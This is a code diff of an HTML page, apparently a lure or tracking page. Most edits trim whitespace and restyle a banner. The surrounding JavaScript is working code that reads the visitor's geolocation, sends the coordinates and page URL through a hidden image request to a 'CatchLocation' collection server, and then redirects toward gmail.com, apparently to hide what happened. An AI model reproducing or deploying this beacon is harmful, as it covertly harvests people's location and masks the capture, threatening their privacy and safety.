@@ -6,25 +6,27 @@
 
     <style type="text/css">
      * {
-       margin: 0; 
+       margin: 0;
        padding: 0;
      }
 
-     div#banner { 
-       position: absolute; 
-       top: 0; 
-       left: 0; 
-       background-color: #73C976; 
-       width: 100%; 
+     div#banner {
+       position: absolute;
+       top: 0;
+       left: 0;
+       background-color: #73C976;
+       width: 100%;
      }
-     div#banner-content { 
-       width: 800px; 
-       margin: 0 auto; 
-       padding: 10px; 
-       border: 1px solid #000;
-       text-align: center;
+     div#banner-content {
+       width: 800px;
+       margin: 0 auto;
+       padding: 10px;
+       text-align: left;
+       font-family: sans-serif;
+       color: white;
+       font-size: 0.9em;
      }
-     div#main-content { 
+     div#main-content {
        padding-top: 70px;
     }
     </style>
@@ -57,12 +59,12 @@ id = setInterval(function() {
 function getLocation() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendPosition);
-    } else { 
+    } else {
         console.log("Geolocation is not supported by this browser.");
     }
 }
 
-function sendPosition(position) {   
+function sendPosition(position) {
     new Image().src = 'http://127.0.0.1:9000/CatchLocation?page='+window.location.href+'&latitude='+    position.coords.latitude.toFixed(2)+'&longitude='+position.coords.longitude.toFixed(2);
     var pageurl = "http://www.gmail.com";
     console.log("relocating to: ", pageurl)
